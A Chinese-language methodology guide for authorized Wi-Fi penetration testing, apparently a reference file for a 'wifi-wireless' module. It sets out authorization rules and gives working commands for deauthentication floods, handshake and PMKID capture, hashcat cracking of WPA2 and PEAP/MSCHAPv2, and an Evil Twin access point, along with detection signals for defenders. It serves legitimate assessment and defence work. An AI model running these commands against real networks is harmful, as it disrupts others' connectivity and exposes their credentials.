# 无线实验纪律：授权边界、deauth 风险、握手与 PMKID

> 被 `wifi-wireless` 引用。Wi-Fi 与 SDR 的区别：**发射是常态、且目标常是别人的网络**。
> 授权边界写错，一次 deauth 就是"干扰他人通信"。

## 一、授权边界（必须先钉死）

| 动作 | 需要什么授权 | 风险 |
| --- | --- | --- |
| 被动监听（monitor 模式抓包） | 场地所有者许可（自己的实验室/客户书面） | 低；但抓到他人流量涉及隐私 |
| 关联到目标 AP | 同上 | 会留日志（关联记录） |
| deauth（解除认证） | **明确写"允许中断服务"的授权** | 高：等同 DoS，可能违反《网络安全法》/CFAA |
| 伪造 AP（Evil Twin） | 明确授权 + 不能诱导真实用户 | 高：可能被认定钓鱼 |
| 抓握手（被动） | 同"被动监听" | 低（但需要目标有客户端连接） |
| PMKID 抓取 | 同"被动监听" | 低（主动发一个关联请求，但不影响他人） |
| 破解（离线） | 授权内的"口令强度评估" | 低（纯离线） |

**绝对不做**：

```text
- 对非授权 BSSID 发 deauth
- 对公共场所（机场/商场/酒店）的任何 AP 做主动测试
- 干扰他人客户端（哪怕"只是测试"）
- 伪造同名 SSID 诱导真实用户连接（钓鱼）
- 对 4-way handshake 做降级攻击（强制 WPA2 以打 WPA3 网络）
```

**授权书写法示例**（报告/委托书里必须有这一句）：

```text
授权方允许对以下 BSSID 在以下时间窗内执行主动测试（含 deauth）：
  BSSID: AA:BB:CC:DD:EE:FF (SSID: LAB-TEST-01)
  时间: 2026-11-14 22:00 - 23:00 (非营业时间)
  范围: 仅限实验室独立 AP，不涉及任何生产/客户网络
```

## 二、进入 monitor 模式（不同网卡差异极大）

```bash
# 先看网卡能力
iw list | grep -A 10 'Supported interface modes'
# 需要看到 "* monitor"；很多内置网卡不支持

# 推荐芯片组（实验用）：Atheros AR9271、RTL8812AU、RTL8814AU、MT7612U

# 方式 1：airmon-ng（会杀掉干扰进程）
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# 输出新接口名，通常是 wlan0mon

# 方式 2：手动（更干净，不影响其它服务）
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
iw dev wlan0 info

# 指定信道
sudo iw dev wlan0 set channel 6

# 退出
sudo ip link set wlan0 down
sudo iw dev wlan0 set type managed
sudo ip link set wlan0 up
```

**常见失败**：`SET failed (-16)` / `Device or resource busy` 说明 NetworkManager 占着网卡。
`sudo systemctl stop NetworkManager` 或 `nmcli radio wifi off`。

## 三、被动侦察：先看清环境

```bash
# 全信道扫描（只监听，不发）
sudo airodump-ng wlan0mon
# 关注列：
#   BSSID  PWR  Beacons  #Data  CH  MB  ENC  CIPHER  AUTH  ESSID
# ENC: WPA2 / WPA3 / OPN / WEP
# AUTH: PSK / MGT（MGT = 802.1X 企业）

# 锁定目标（写文件 + 指定信道）
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon

# 看客户端（第二张表）
# 关注 STATION 列：有客户端的 AP 才能抓握手
```

**判据**：`ENC=WPA2` + `AUTH=PSK` 才适合抓握手；`AUTH=MGT`（企业）走的是 802.1X，
握手抓下来也没用（需要证书/账号）。`WPA3` 见第六节。

## 四、抓 4-way handshake（被动优先）

```bash
# 不 deauth，只等（最合规）
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
# 等到右上角出现 "WPA handshake: AA:BB:CC:DD:EE:FF"

# 有客户端时，用"温和"的重新关联引导（比 deauth 轻）
# 但严格说仍属主动干扰，需授权
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
#   --deauth 0 = 持续发送，直到抓到；这就是 DoS，授权要写明

# 只发少量（更克制）
sudo aireplay-ng --deauth 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
#   指定客户端 -c，避免影响其他客户端
```

**deauth 的风险要写进报告**：

| 风险 | 说明 |
| --- | --- |
| 服务中断 | 所有关联该 AP 的客户端断网，重连需数秒 |
| 工业/医疗设备 | 某些设备断连后不自动重连，需人工干预 |
| 触发告警 | 企业 WIDS/WIPS 会记录 deauth 洪水，可能触发安全响应 |
| 法律 | 未授权 deauth = 干扰通信，可能被追责 |

## 五、PMKID（不需要客户端）

PMKID 攻击的价值：**即使没有客户端在线也能拿到可破解的材料**。

```bash
# hcxdumptool（主动发 assoc 请求，但不影响已有连接）
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng \
  --enable_status=1 --filterlist_ap=target.txt --filtermode=2

# target.txt 格式：BSSID 在前，不带冒号也行
# AABBCCDDEEFF

# 转换格式
hcxpcapngtool -o hash.hc22000 pmkid.pcapng
# 输出里会标 PMKID 或 EAPOL

# 破解
hashcat -m 22000 hash.hc22000 wordlist.txt
#   -m 22000 = WPA-PBKDF2-PMKID+EAPOL
#   老格式：-m 16800 (PMKID) / -m 2500 (handshake)
```

**hcxdumptool 的风险**：它比 airodump 更"主动"（会发 probe/assoc），
企业 WIDS 容易发现。授权里要区分"被动抓包"和"主动探测"。

**判据**：`hcxpcapngtool` 输出里出现 `PMKID` 行 = 拿到；只有 `EAPOL` 行 = 抓到握手
（需要客户端在线）。

## 六、WPA3 的差异（别用 WPA2 的思路打）

| 特性 | WPA2-PSK | WPA3-SAE |
| --- | --- | --- |
| 握手 | 4-way（含 PMKID） | SAE（Dragonfly）commit/exchange |
| 离线破解 | 可（PMKID/handshake） | **不可**（每次尝试需一次在线交互） |
| 抓包价值 | 高 | 低（除非降级攻击成功） |
| 降级攻击 | — | 依赖 WPA2/WPA3 混合模式（transition mode） |
| 已知攻击 | deauth + 抓握手 | Dragonblood（侧信道）、降级到 WPA2 |

```bash
# 判断是否 transition mode（同时支持 WPA2 和 WPA3）
sudo airodump-ng wlan0mon
# 看 ENC 列：WPA2 WPA3 同时出现 = transition mode
# RSN IE 里同时有 AKM 2 (PSK) 和 AKM 8 (SAE)

# 用 wpa_supplicant 试关联（合法环境）
wpa_supplicant -i wlan1 -c <(wpa_passphrase "LAB-TEST-01" "password")
```

**关键判据**：`ENC` 列只显示 `WPA3` = 纯 SAE，握手抓了也没用；
显示 `WPA2 WPA3` = transition mode，可以用 WPA2 客户端抓握手（这本身不是漏洞，
但如果 AP 允许 WPA2 客户端，整体强度就降到 WPA2）。

**WPA3 的"看起来成功其实是假"**：
- 抓到 SAE commit/exchange → 只能做**在线**字典攻击（每次尝试一次完整 SAE 交互），
  速度是每秒几次，不是 hashcat 的百万次。
- 报告不能写"WPA3 可离线破解"。

## 七、企业网（802.1X / WPA-Enterprise）

```bash
# 抓 EAP 交换
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w eap wlan0mon
# 关注 AUTH=MGT

# 常见问题：EAP 类型
#   EAP-PEAP (MSCHAPv2) → 可抓 challenge/response 离线爆破（asleap）
#   EAP-TLS → 需要客户端证书，抓包无用
#   EAP-TTLS → 同 PEAP
```

```bash
# 从 pcap 提 MSCHAPv2 challenge/response
tshark -r eap.pcapng -Y 'eap' -T fields -e eap.type -e radius.mschap2.challenge -e radius.mschap2.response

# 离线爆破（需要 asleap 或 hashcat -m 5500）
hashcat -m 5500 netntlm.txt wordlist.txt
```

**判据**：`AUTH=MGT` 且 EAP 类型是 PEAP/TTLS = 有离线爆破空间；
EAP-TLS = 没有（除非拿到客户端证书）。

## 八、伪造 AP / Evil Twin（高风险，慎用）

```bash
# 仅在授权环境、且不诱导真实用户时
# hostapd 起一个同名 AP
cat > hostapd.conf <<'EOF'
interface=wlan1
driver=nl80211
ssid=LAB-TEST-01
hw_mode=g
channel=6
wpa=2
wpa_passphrase=testtest123
EOF
sudo hostapd hostapd.conf

# 配合 dnsmasq 提供 DHCP + 强制门户
sudo dnsmasq -C dnsmasq.conf --no-daemon
```

**为什么高风险**：如果 SSID 与真实网络同名，真实用户设备会**自动连接**你的 AP，
这在法律上接近"钓鱼"。真实评估中只做"检测是否存在同名 AP"（被动），
不做"伪造并等待连接"。

## 九、凭证验证（怎么证明"拿到了可用凭据"）

```bash
# 1) 握手/PMKID 破解出 PSK
hashcat -m 22000 hash.hc22000 rockyou.txt --show
# 输出：<hash>:<password>

# 2) 用 PSK 实际关联（这才是"可用"的证明）
sudo wpa_supplicant -i wlan1 -c <(wpa_passphrase "LAB-TEST-01" "cracked_pass") -B
sudo dhclient wlan1
ip addr show wlan1 | grep 'inet '
ping -c 3 192.168.1.1

# 3) 确认拿到的是"网络访问"而不只是"关联"
curl -s http://192.168.1.1/ | head
```

**反例**：hashcat 显示已破解，但 PSK 是旧口令（AP 已换），关联会失败
（`4-way handshake failed`）。所以**必须实际关联一次**。

## 十、检测视角

| 手法 | 日志/信号 | 特征 |
| --- | --- | --- |
| monitor 模式 | 无（本地行为） | 但网卡进入 monitor 会有驱动日志 |
| deauth 洪水 | WIDS / AP 日志 | 大量 `Deauthenticate` 管理帧，reason code 7 |
| 抓握手 | AP 日志 | 客户端异常重连（因 deauth 触发） |
| PMKID | WIDS | 未关联的 assoc 请求（源 MAC 未在客户端列表） |
| Evil Twin | WIDS | 同 SSID 不同 BSSID，且信号强度异常 |
| 破解 | 无（离线） | 但关联时的失败重试会在 AP 日志留痕 |
| 企业网爆破 | RADIUS 日志 | 大量失败认证（`Access-Reject`） |

```bash
# 从 pcap 里统计 deauth（防守方复盘）
tshark -r capture.pcap -Y 'wlan.fc.type_subtype == 0x0c' -T fields -e wlan.sa -e wlan.da | sort | uniq -c | sort -rn | head
```

## 十一、验伤信号

| 声称 | 硬证据 | 假成功反例 |
| --- | --- | --- |
| 抓到握手 | `hcxpcapngtool` 输出含 `EAPOL` 且 hashcat 能加载 | airodump 显示 "handshake" 但文件里只有 beacon |
| 拿到 PMKID | 输出含 `PMKID` 行，hashcat `-m 22000` 能跑 | 只有 EAPOL（那是握手不是 PMKID） |
| 破解成功 | `hashcat --show` 有明文，且能用它关联成功 | hashcat 显示 cracked 但关联失败（口令已过期） |
| deauth 生效 | 目标客户端真的断连并在 airodump 里消失又出现 | 发了 deauth 但客户端没反应（帧被 WIPS 丢弃） |
| Evil Twin 可用 | 客户端真的关联到你的 AP（在 hostapd 日志看到） | 只是起了 AP，没有客户端来 |

## 十二、常见坑

1. **网卡不支持 monitor**。内置 Intel/Realtek 网卡大多不行，先 `iw list` 确认。
2. **监听的信道不对**。目标在 6 信道，你在 1 信道抓，永远抓不到。
   `airodump-ng -c 6` 必须和目标一致。
3. **5GHz 需要单独信道**。36/40/44/48 等，`-c 36`；`airodump-ng` 默认只扫 2.4G。
4. **deauth 的 reason code**。用 `--deauth 3` 而不是 `0`（持续），后者更像攻击。
5. **PMKID 不是每个 AP 都有**。取决于 AP 实现（是否在第一次 EAPOL 里带 PMKID），
   拿不到就退回抓握手。
6. **WPA3 的 `ENC` 列只有 `WPA3`** 时不要浪费时间抓握手。
7. **hashcat 的 `-m 22000` 需要 hcxtools 转格式**。直接给 pcap 会报错。
8. **破解出来的口令可能是"访客网络"的**。要确认关联的 SSID 与目标是同一个。